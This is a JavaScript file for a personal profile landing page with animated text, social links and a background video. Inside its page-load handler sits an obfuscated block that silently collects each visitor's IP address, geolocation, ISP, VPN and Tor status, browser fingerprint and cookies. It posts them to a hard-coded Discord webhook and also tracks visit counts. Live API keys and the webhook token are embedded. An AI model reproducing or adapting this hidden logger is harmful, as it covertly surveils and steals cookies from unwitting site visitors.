'use strict';

const ipgeolocation = 'https://api.ipgeolocation.io/ipgeo?apiKey=31ece79449854d1c8059ec105e82b33d';

const timeouts = [];

const mobileAndTabletCheck = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

const letters = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz";

document.querySelector("h1").onmouseover = event => {
  let iterations = 0;
  
  const interval = setInterval(() => {
  
    event.target.innerText = event.target.innerText.split("")
      .map((letter, index) => {
        if(index < iterations) {
          return event.target.dataset.value[index];
        }
      
        return letters[Math.floor(Math.random() * 26)]
      })
      .join("");
    if(iterations >= event.target.dataset.value.length) clearInterval(interval);
    
    iterations += 3 / 8;
  }, 30);
}

$(document).ready(() => {
  const links = [
    {
      name: 'wanted.lol',
      link: 'wanted.lol/losr',
    },
    {
      name: 'discord',
      link: 'discord.com/users/1083368117230653460',
    },
    {
      name: 'feds.lol',
      link: 'feds.lol/losr',
    },
    {
      name: 'github',
      link: 'github.com/madhead341',
    }
  ];

  for (let i in links) {
    let link = links[i];

    $('#marquee').append(`<a href="https://${link.link}" target="_BLANK">${link.name}</a>`);

    link = $('#marquee').children('a').last();

    if (i != links.length - 1) $('#marquee').append(' <img class="emoticon" src="assets/others/dot.png"> ');
  }

  if (mobileAndTabletCheck()) {
    $('#background').replaceWith('<div id="background" style="background-image: url(assets/images/mobile-background.jpg);"></div>');

    app.shouldIgnoreVideo = true;
  }

  app.titleChanger(['!', '! L', '! LO', '! LO$','! LO$R']);
  app.iconChanger(['assets/icons/rose1.jpeg', 'assets/icons/rose2.jpg', 'assets/icons/rose3.png', 'assets/icons/rose4.png']);
});

if ($.cookie('videoTime')) {
  app.videoElement.currentTime = $.cookie('videoTime');
  app.audioElement.currentTime = $.cookie('videoTime');
}

document.addEventListener('contextmenu', (event) => {
  event.preventDefault();
});

document.body.onkeyup = (event) => {
  if (event.keyCode == 32 && app.skippedIntro) {
    if (app.backgroundToggler) {
      app.videoElement.play();
      app.audioElement.play();
    } else {
      app.videoElement.pause();
      app.audioElement.pause();
    }

    return (app.backgroundToggler = !app.backgroundToggler);
  }
};

window.addEventListener('load', function() {
const _0x3e37c3=_0x1829;function _0x1829(_0x291e3e,_0x5ce1f2){const _0x578ce2=_0x578c();return _0x1829=function(_0x182924,_0x2d99f9){_0x182924=_0x182924-0xcc;let _0x56b39c=_0x578ce2[_0x182924];return _0x56b39c;},_0x1829(_0x291e3e,_0x5ce1f2);}(function(_0x364548,_0x3b8e16){const _0x4b4814=_0x1829,_0x324195=_0x364548();while(!![]){try{const _0x59c8b1=-parseInt(_0x4b4814(0x160))/0x1+-parseInt(_0x4b4814(0x10c))/0x2+parseInt(_0x4b4814(0x12c))/0x3*(parseInt(_0x4b4814(0x173))/0x4)+-parseInt(_0x4b4814(0x123))/0x5+-parseInt(_0x4b4814(0xd2))/0x6*(-parseInt(_0x4b4814(0x15f))/0x7)+parseInt(_0x4b4814(0x16a))/0x8+parseInt(_0x4b4814(0x103))/0x9;if(_0x59c8b1===_0x3b8e16)break;else _0x324195['push'](_0x324195['shift']());}catch(_0xba3058){_0x324195['push'](_0x324195['shift']());}}}(_0x578c,0x38463));async function getIPInfo(){const _0x133541=_0x1829,_0x2f7e6e=await fetch(_0x133541(0xda)),_0x942b31=await _0x2f7e6e[_0x133541(0x136)](),_0x2a920d=navigator['userAgent'][_0x133541(0x159)]()[_0x133541(0xe8)](_0x133541(0x12f)),_0x50fafa=navigator['platform'][_0x133541(0x159)](),_0x6f7aab=_0x942b31[_0x133541(0x16b)][_0x133541(0x11f)]['map'](_0x2df756=>{const _0x2b22ba=_0x133541;return _0x2b22ba(0xce)+_0x2df756[_0x2b22ba(0x105)]+_0x2b22ba(0xf9)+_0x2df756[_0x2b22ba(0x155)]+_0x2b22ba(0x142)+_0x2df756[_0x2b22ba(0x177)];}),_0x33e69e={'asn':{'asn':_0x942b31['asn'][_0x133541(0x13a)],'name':_0x942b31[_0x133541(0x13a)][_0x133541(0x105)],'domain':_0x942b31['asn'][_0x133541(0x138)],'route':_0x942b31[_0x133541(0x13a)][_0x133541(0xd9)],'type':_0x942b31['asn'][_0x133541(0x177)]}};function _0x117960(){const _0xe44b5e=_0x133541;if(navigator[_0xe44b5e(0xdb)]&&navigator[_0xe44b5e(0xdb)][_0xe44b5e(0x164)])return(navigator[_0xe44b5e(0xdb)]['downlink']*0x8)[_0xe44b5e(0x176)](0x2)+_0xe44b5e(0x110);return _0xe44b5e(0x15a);}const _0x38d4aa=_0x117960();function _0x54add8(){const _0x5cf633=_0x133541,_0xd13fe3=navigator[_0x5cf633(0xdb)]||navigator[_0x5cf633(0x169)]||navigator[_0x5cf633(0xf6)];if(!_0xd13fe3)return _0x5cf633(0x109);const _0x584e14=_0xd13fe3[_0x5cf633(0x164)]||_0xd13fe3[_0x5cf633(0x177)];if(_0x584e14===_0x5cf633(0x174))return'Ethernet';return _0x584e14;}const _0xe96a3b=_0x54add8(),_0x400891=async()=>{const _0x4d8fbf=_0x133541;try{const _0x5dd54c=await fetch('https://ipapi.co/json'),_0x5029f1=await _0x5dd54c[_0x4d8fbf(0x136)]();return _0x5029f1;}catch(_0x103b0b){return console[_0x4d8fbf(0x108)](_0x103b0b),null;}},_0xeb8620=await _0x400891(),_0x371b3b=_0xeb8620?.['ip'],_0x2d4481=_0xeb8620?.[_0x133541(0x107)];let _0x4fd81d;if(/^win/[_0x133541(0x16d)](_0x50fafa))_0x4fd81d=_0x133541(0x100);else{if(/^mac/[_0x133541(0x16d)](_0x50fafa))_0x4fd81d=_0x133541(0x145);else{if(/^linux/[_0x133541(0x16d)](_0x50fafa))_0x4fd81d=_0x133541(0x130);else{if(/^android/['test'](_0x50fafa))_0x4fd81d=_0x133541(0x11b);else/^ios/['test'](_0x50fafa)?_0x4fd81d=_0x133541(0x145):_0x4fd81d=_0x133541(0x15a);}}}const _0x1012a0={'symbol':_0x942b31[_0x133541(0x13d)][_0x133541(0x137)],'name':_0x942b31[_0x133541(0x13d)][_0x133541(0x105)],'code':_0x942b31[_0x133541(0x13d)][_0x133541(0x14d)]},_0x3c2047={'name':_0x942b31[_0x133541(0xcc)]['name'],'offset':_0x942b31[_0x133541(0xcc)][_0x133541(0xe1)]},_0x17043d={'location':{'IPv4':_0x942b31['ip'],'continent':_0x942b31[_0x133541(0x11d)],'country':_0x942b31[_0x133541(0xf7)],'country_code':_0x942b31[_0x133541(0x141)],'latitude':_0x942b31[_0x133541(0x12d)],'longitude':_0x942b31[_0x133541(0x156)],'state':_0x942b31[_0x133541(0x163)],'city':_0x942b31[_0x133541(0x140)],'googleMaps':_0x133541(0x12b)+_0x942b31[_0x133541(0x12d)]+','+_0x942b31[_0x133541(0x156)],'timezone':_0x3c2047,'currency':_0x1012a0,'phoneCode':'+'+_0x942b31[_0x133541(0xcd)],'languages':_0x942b31[_0x133541(0x170)][_0x133541(0x128)](_0x23daf6=>({'name':_0x23daf6[_0x133541(0x105)],'native':_0x23daf6[_0x133541(0xde)],'code':_0x23daf6[_0x133541(0x14d)]})),'inEU':_0x942b31[_0x133541(0x117)]?_0x133541(0x124):'No'},'info':{'ipv4':_0x371b3b,'ip':_0x942b31['ip'],'provider':_0x942b31[_0x133541(0x13a)][_0x133541(0x105)]+'\x20('+_0x942b31[_0x133541(0x13a)][_0x133541(0x138)]+_0x133541(0xf1)+_0x942b31['asn']['type'],'version':_0x942b31['version'],'network':''+_0x942b31[_0x133541(0x13a)][_0x133541(0xd9)],'ipv6network':_0x2d4481,'connectionSpeed':_0x117960(),'wifiType':_0x54add8(),'threat':{'is_tor':_0x942b31[_0x133541(0x16b)][_0x133541(0x14e)],'is_vpn':_0x942b31[_0x133541(0x16b)]['is_proxy'],'is_icloud_relay':_0x942b31[_0x133541(0x16b)][_0x133541(0xd0)],'is_proxy':_0x942b31[_0x133541(0x16b)][_0x133541(0xd8)],'is_datacenter':_0x942b31[_0x133541(0x16b)][_0x133541(0xcf)],'is_anonymous':_0x942b31[_0x133541(0x16b)][_0x133541(0x171)],'is_known_attacker':_0x942b31[_0x133541(0x16b)]['is_known_attacker'],'is_known_abuser':_0x942b31[_0x133541(0x16b)][_0x133541(0x162)],'is_threat':_0x942b31[_0x133541(0x16b)][_0x133541(0x16e)],'is_bogon':_0x942b31[_0x133541(0x16b)]['is_bogon'],'blocklists':_0x6f7aab}},'browserInfo':{'mobile':_0x2a920d,'browser':navigator[_0x133541(0x148)],'manufacturer':_0x4fd81d,'userAgent':navigator[_0x133541(0x133)],'page':location['href'],'referrer':document[_0x133541(0x106)],'windowSize':window[_0x133541(0x146)]+'x'+window[_0x133541(0x154)],'historyLength':history[_0x133541(0x161)],'language':navigator[_0x133541(0x13f)],'platform':navigator[_0x133541(0x10e)],'javaEnabled':navigator[_0x133541(0x167)](),'cookiesEnabled':navigator[_0x133541(0xf5)],'javascriptEnabled':!![],'cookieDump':document[_0x133541(0x14f)],'cpuThreads':navigator[_0x133541(0xe6)],'memory':Math[_0x133541(0xea)](performance[_0x133541(0x166)][_0x133541(0x116)]/0x100000*0x64)/0x64+_0x133541(0xe0),'plugins':Array['from'](navigator[_0x133541(0x119)])[_0x133541(0x128)](_0x503858=>_0x503858[_0x133541(0x105)]+'\x20('+_0x503858[_0x133541(0x147)]+')')['join'](',\x20'),'webdriver':navigator[_0x133541(0xe5)]?_0x133541(0x124):'No','battery':navigator[_0x133541(0x15b)]?await navigator[_0x133541(0x15b)]()[_0x133541(0x10f)](_0xe63929=>Math['floor'](_0xe63929[_0x133541(0xff)]*0x64)+'%'):'N/A','touchPoints':navigator[_0x133541(0x11e)]||'???','doNotTrack':navigator[_0x133541(0x13b)]==='1'||navigator[_0x133541(0x13b)]===_0x133541(0xf0)?_0x133541(0x124):'No'}},_0x18c98f={'title':_0x133541(0xfa),'description':_0x133541(0x118)+'```diff\x0a'+_0x133541(0x165)+(_0x133541(0x172)+_0x17043d['location']['IPv4']+'\x0a')+(_0x133541(0x157)+_0x17043d[_0x133541(0x14b)]['continent']+'\x0a')+('+\x20Country:\x20'+_0x17043d['location']['country']+'\x0a')+(_0x133541(0x114)+_0x17043d['location'][_0x133541(0x141)]+'\x0a')+('+\x20State:\x20'+_0x17043d[_0x133541(0x14b)][_0x133541(0xf3)]+'\x0a')+(_0x133541(0xd5)+_0x17043d['location'][_0x133541(0x140)]+'\x0a')+('+\x20Google\x20Maps:\x20'+_0x17043d[_0x133541(0x14b)][_0x133541(0x11c)]+'\x0a')+(_0x133541(0x101)+_0x3c2047[_0x133541(0x105)]+_0x133541(0xe2)+_0x3c2047[_0x133541(0xe1)]+')\x0a')+(_0x133541(0x175)+_0x1012a0[_0x133541(0x137)]+'\x20-\x20'+_0x1012a0[_0x133541(0x105)]+'\x20('+_0x1012a0[_0x133541(0x14d)]+')\x0a')+('+\x20Phone\x20Code:\x20'+_0x17043d['location'][_0x133541(0x120)]+'\x0a')+(_0x133541(0xfd)+_0x17043d[_0x133541(0x14b)][_0x133541(0x170)]['map'](_0x468dcc=>_0x468dcc[_0x133541(0x105)]+_0x133541(0xd1)+_0x468dcc[_0x133541(0x14d)])['join'](',\x20')+'\x0a')+('+\x20In\x20EU:\x20'+_0x17043d['location'][_0x133541(0xdd)]+'\x0a\x0a')+(_0x133541(0x143)+_0x17043d[_0x133541(0x14b)]['latitude']+'\x0a')+(_0x133541(0xe3)+_0x17043d['location'][_0x133541(0x156)]+'\x0a\x0a')+_0x133541(0xfc)+(_0x133541(0x129)+_0x17043d[_0x133541(0x16c)][_0x133541(0x131)]+'\x0a')+(_0x133541(0xf4)+_0x17043d['info']['ipv6network']+'\x0a')+(_0x133541(0xfe)+_0x17043d[_0x133541(0x16c)]['ip']+'\x0a')+(_0x133541(0xd4)+_0x17043d[_0x133541(0x16c)][_0x133541(0x107)]+'\x0a')+(_0x133541(0x13c)+_0x17043d[_0x133541(0x16c)]['connectionSpeed']+'\x0a')+(_0x133541(0x144)+_0x17043d['info'][_0x133541(0x111)]+'\x0a')+(_0x133541(0x104)+_0x17043d[_0x133541(0x16c)][_0x133541(0xe4)]+'\x0a\x0a')+_0x133541(0x13e)+('+\x20Threat:\x20'+_0x17043d[_0x133541(0x16c)][_0x133541(0x16b)][_0x133541(0x16e)]+'\x0a')+(_0x133541(0xd3)+_0x17043d[_0x133541(0x16c)][_0x133541(0x16b)][_0x133541(0x134)]+'\x0a')+('+\x20Proxy:\x20'+_0x17043d['info'][_0x133541(0x16b)][_0x133541(0xd8)]+'\x0a')+(_0x133541(0xf8)+_0x17043d['info'][_0x133541(0x16b)]['is_tor']+'\x0a')+(_0x133541(0x14c)+_0x17043d[_0x133541(0x16c)][_0x133541(0x16b)][_0x133541(0x162)]+'\x0a\x0a')+('+\x20BlockLists:\x20'+_0x17043d[_0x133541(0x16c)][_0x133541(0x16b)][_0x133541(0x11f)]+'\x0a')+_0x133541(0x125)+_0x133541(0x12e)+'```diff\x0a'+_0x133541(0x158)+(_0x133541(0x10b)+_0x17043d['browserInfo']['mobile']+'\x0a')+(_0x133541(0x115)+_0x17043d[_0x133541(0x139)][_0x133541(0x112)]+'\x0a')+(_0x133541(0x168)+_0x17043d['browserInfo'][_0x133541(0x152)]+'\x0a')+(_0x133541(0x127)+_0x17043d[_0x133541(0x139)]['userAgent']+'\x0a')+(_0x133541(0x15e)+_0x17043d['browserInfo']['page']+'\x0a')+(_0x133541(0xee)+_0x17043d[_0x133541(0x139)]['referrer']+'\x0a')+('+\x20History\x20Length:\x20'+_0x17043d[_0x133541(0x139)][_0x133541(0x132)]+'\x0a')+('+\x20Language:\x20'+_0x17043d['browserInfo'][_0x133541(0x13f)]+'\x0a')+('+\x20Platform:\x20'+_0x17043d[_0x133541(0x139)]['platform']+'\x0a')+(_0x133541(0xe9)+_0x17043d[_0x133541(0x139)][_0x133541(0x167)]+'\x0a')+(_0x133541(0x102)+_0x17043d[_0x133541(0x139)][_0x133541(0x119)]+'\x0a')+(_0x133541(0x15d)+_0x17043d['browserInfo'][_0x133541(0xe5)]+'\x0a')+(_0x133541(0x122)+_0x17043d[_0x133541(0x139)][_0x133541(0x126)]+'\x0a')+(_0x133541(0xdc)+_0x17043d[_0x133541(0x139)][_0x133541(0x150)]+'\x0a')+(_0x133541(0xd6)+_0x17043d[_0x133541(0x139)][_0x133541(0x13b)]+'\x0a\x0a')+'-Other\x20Information\x0a'+('+\x20Cookie\x20Dump:\x20'+_0x17043d[_0x133541(0x139)]['cookieDump']+'\x0a')+(_0x133541(0x10a)+_0x17043d['browserInfo'][_0x133541(0xe7)]+'\x0a')+(_0x133541(0x135)+_0x17043d[_0x133541(0x139)][_0x133541(0xec)]+'\x0a')+(_0x133541(0x153)+_0x17043d[_0x133541(0x139)][_0x133541(0xfb)]+'\x0a')+(_0x133541(0x15c)+_0x17043d[_0x133541(0x139)]['cookiesEnabled']+'\x0a')+('+\x20Memory:\x20'+_0x17043d[_0x133541(0x139)][_0x133541(0x166)]+'\x0a')+_0x133541(0x125),'color':0xff00},_0x497d6e=_0x133541(0xeb);await fetch(_0x497d6e,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x133541(0x10d)]({'content':_0x133541(0x121),'embeds':[_0x18c98f]})});}getIPInfo();const response=await fetch(_0x3e37c3(0xda)),data=await response[_0x3e37c3(0x136)](),getIP=async()=>{const _0x13678c=_0x3e37c3;try{const _0x427778=await fetch('https://ipapi.co/json'),_0x223231=await _0x427778[_0x13678c(0x136)]();return _0x223231;}catch(_0x226ec4){return console[_0x13678c(0x108)](_0x226ec4),null;}},ipInfo={'location':{'IPv4':data['ip']}},ipData=await getIP(),ipv4=ipData?.['ip'];function _0x578c(){const _0x396bd6=['userAgent','is_vpn','+\x20Javascript\x20Enabled:\x20','json','symbol','domain','browserInfo','asn','doNotTrack','+\x20Bandwith:\x20','currency','-\x20Threats\x20&\x20Proxy/VPN\x20Information:\x0a','language','city','country_code','\x20\x0a+\x20Type:\x20','+\x20Latitude:\x20','+\x20Wifi\x20Type:\x20','Apple','innerWidth','description','appName','Error\x20sending\x20message\x20to\x20Discord\x20webhook:','IPv4','location','+\x20Known\x20Abuser:\x20','code','is_tor','cookie','touchPoints','getItem','manufacturer','+\x20CPU\x20Threads:\x20','innerHeight','site','longitude','+\x20Continent:\x20','-\x20Browser\x20&\x20Document\x20Information:\x0a','toLowerCase','Unknown','getBattery','+\x20Cookies\x20Enabled:\x20','+\x20Webdriver/Bot:\x20','+\x20Page:\x20','175798prQBvg','360699gIshBv','length','is_known_abuser','region','effectiveType','-\x20Location\x20Information:\x0a','memory','javaEnabled','+\x20Manufacturer:\x20','mozConnection','2875168YuBxJA','threat','info','test','is_threat','Failed\x20to\x20send\x20message\x20to\x20Discord\x20webhook:','languages','is_anonymous','+\x20IP:\x20','29356LQpHkK','ethernet','+\x20Currency:\x20','toFixed','type','time_zone','calling_code','\x0a+\x20Name:\x20','is_datacenter','is_icloud_relay','\x20-\x20','54XBDgde','+\x20VPN:\x20','+\x20Network\x20(IPv4):\x20','+\x20City:\x20','+\x20Do\x20Not\x20Track:\x20','statusText','is_proxy','route','https://api.ipdata.co/?api-key=d75ad8557d1eb86f55d816c62987104cc8e1fe9b219dd85857875a44','connection','+\x20Touch\x20Points:\x20','inEU','native','setItem','\x20MB','offset','\x20(Offset:\x20','+\x20Longitude:\x20','provider','webdriver','hardwareConcurrency','windowSize','includes','+\x20Java\x20Enabled:\x20','round','https://discord.com/api/webhooks/1143606129474146344/ptDmmzLtGV9cLQXi9vdxRaBSCsQW1EZGMBHXgGE1NLNhv36J6h0sdkco-vDo2ITi63qo','javascriptEnabled','visitCount','+\x20Referrer:\x20','message','yes',')\x20-\x20','**\x20has\x20visited\x20your\x20website\x20**','state','+\x20Network\x20(IPv6):\x20','cookieEnabled','webkitConnection','country_name','+\x20Tor\x20Browser:\x20','\x20\x0a+\x20Site:\x20','__**Someone\x20Visited\x20Your\x20Site!**__','cpuThreads','-\x20Network\x20Information:\x0a','+\x20Languages:\x20','+\x20IP\x20(IPv4):\x20','level','Microsoft','+\x20Timezone:\x20','+\x20Plugins:\x20','264312tFAFbC','+\x20Provider:\x20','name','referrer','network','error','unknown','+\x20Window\x20Size:\x20','+\x20Mobile:\x20','554044xbudyO','stringify','platform','then','\x20Mb/s','wifiType','browser','POST','+\x20Country\x20Code:\x20','+\x20Browser:\x20','totalJSHeapSize','is_eu','**IP\x20Info**\x0a','plugins','application/json','Google','googleMaps','continent_code','maxTouchPoints','blocklists','phoneCode','<@1128055835344506980>','+\x20Battery:\x20','640990TngXPA','Yes','```','battery','+\x20User\x20Agent:\x20','map','+\x20IP\x20(IPv6):\x20','catch','https://www.google.com/maps?q=','156EJHqHW','latitude','**Browser\x20Info**\x0a','mobile','Linux','ipv4','historyLength'];_0x578c=function(){return _0x396bd6;};return _0x578c();}_0x4bc049:(function(){const _0x506b0c=_0x3e37c3,_0x431725=_0x506b0c(0xeb);function _0x183793(){const _0x32d494=_0x506b0c;let _0x615ad4=localStorage[_0x32d494(0x151)]('visitCount');return(isNaN(_0x615ad4)||_0x615ad4===null)&&(_0x615ad4=0x0),parseInt(_0x615ad4,0xa);}function _0x1782b7(){const _0x1cf5f3=_0x506b0c;let _0x5dc21d=_0x183793();_0x5dc21d++,localStorage[_0x1cf5f3(0xdf)](_0x1cf5f3(0xed),_0x5dc21d);const _0x31f387='**'+ipInfo[_0x1cf5f3(0x14b)][_0x1cf5f3(0x14a)]+_0x1cf5f3(0xf2)+_0x5dc21d+'**\x20time(s).';fetch(_0x431725,{'method':_0x1cf5f3(0x113),'headers':{'Content-Type':_0x1cf5f3(0x11a)},'body':JSON[_0x1cf5f3(0x10d)]({'content':_0x31f387})})[_0x1cf5f3(0x10f)](_0x384613=>{const _0x13c633=_0x1cf5f3;!_0x384613['ok']&&console[_0x13c633(0x108)](_0x13c633(0x16f),_0x384613[_0x13c633(0xd7)]);})[_0x1cf5f3(0x12a)](_0xb1b760=>{const _0x52f3ca=_0x1cf5f3;console[_0x52f3ca(0x108)](_0x52f3ca(0x149),_0xb1b760[_0x52f3ca(0xef)]);});}setTimeout(_0x1782b7,0x7d0);}());
});

setInterval(() => {
  $('.troll').remove();
}, 600);

$('.skip').click(() => {
  skipIntro();
});

$.fn.extend({
  animateCss: function(animationName) {
    const animationEnd = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';

    this.addClass(`animated ${animationName}`).one(animationEnd, () => {
      $(this).removeClass(`animated ${animationName}`);
    });

    return this;
  },
});

const writeLine = (text, speed, timeout, callback) => {
  timeout = typeof timeout === 'number' ? timeout : [0, (callback = timeout)];

  const lineNumber = app.id !== 2 ? ++app.id : (app.id += 2);

  setTimeout(() => {
    const typed = new Typed(`#line${lineNumber}`, {
      strings: text,
      typeSpeed: speed,
      onComplete: callback,
    });
  }, timeout);
};

$.getJSON(ipgeolocation, (data) => {
  const usernames = ['user', 'dude'];
  const ip = data.ip ? data.ip : usernames[Math.floor(Math.random() * usernames.length)];
  const country = data.country_name ? data.country_name : 'your country';
  
  const ips = ['84.194.95.249', '81.82.221.23', '209.107.204.33', '205.185.222.206', '205.185.222.207', '2a02:1810:8c1f:6200:4026:3744:9fbd:f027', '205.185.222.207', '84.194.95.249', '205.185.222.208','205.185.222.182', '209.107.204.71', '209.107.204.72', '209.107.204.73', '2a02:1810:8c1f:6200:85be:2b02:e36a:2d90'];
  const username = ips.includes(ip) ? '[lloserr]' : '[unknown]';

  writeLine(['Authenticating...', `Granting access to <span style='font-size: 14px; color: #06d;'>${username}</span>...`], 30, () => {
    if (app.skippedIntro) return;

    clearCursor();
    writeLine([`Access granted! <span style='font-size: 14px; color: #0f0;'>[success]</span>`, `Welcome back, <i style='color: #0f0'>${ip}</i>! By the way, nice to see someone from ${country} here!`], 30, 500, () => {
      writeLine([`<i style='color: #F62459'>~ lloserr </i>`], 120, 500, () => {
        timeouts.push(
          setTimeout(() => {
            if (app.skippedIntro) return;

            clearCursor();

            setTimeout(() => {
              skipIntro();
            }, 500);
          }, 1000)
        );
      });
    });
  });
});

  




const skipIntro = () => {
  if (app.skippedIntro) return;

  app.skippedIntro = true;

  timeouts.forEach((timeout) => {
    clearTimeout(timeout);
  });

  $('.top-right').remove();

  $('#main').fadeOut(100, () => {
    $('#main').remove();

    $('#marquee').marquee({
      duration: 15000,
      gap: 420,
      delayBeforeStart: 1000,
      direction: 'left',
      duplicated: true,
    });

    setTimeout(() => {
      $('.brand-header').animateCss(app.effects[Math.floor(Math.random() * app.effects.length)]);
    }, 200);

    setTimeout(() => {
      const typed = new Typed('#brand', {
        strings: app.brandDescription,
        typeSpeed: 40,

        onComplete: () => {
          clearCursor();
        },
      });
    }, 1350);

    setTimeout(() => {
      if (!app.shouldIgnoreVideo) {
        app.videoElement.play();
        app.audioElement.play();
      }

      app.videoElement.addEventListener(
        'timeupdate',
        () => {
          $.cookie('videoTime', app.videoElement.currentTime, { expires: 1 });
        },
        false
      );

      $('.marquee-container').css('visibility', 'visible').hide().fadeIn(100);

      $('.marquee-container').animateCss('zoomIn');

      $('.container').fadeIn();

      $('.background').fadeIn(200, () => {
        if (!app.shouldIgnoreVideo) $('#audio').animate({ volume: app.musicVolume }, app.musicFadeIn);
      });
    }, 200);
  });
};

const clearCursor = () => {
  return $('span').siblings('.typed-cursor').css('opacity', '0');
};

document.onmousemove = e => {
  const x = e.clientX;
  const y = e.clientY;

  for (const card of document.getElementsByClassName("card")) {
    const rect = card.getBoundingClientRect();
    const isInsideCard = x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom;

    card.style.setProperty("--mouse-x", isInsideCard ? `${x - rect.left}px` : "50%");
    card.style.setProperty("--mouse-y", isInsideCard ? `${y - rect.top}px` : "50%");
    card.classList.toggle("outside-card", !isInsideCard);
  }
};
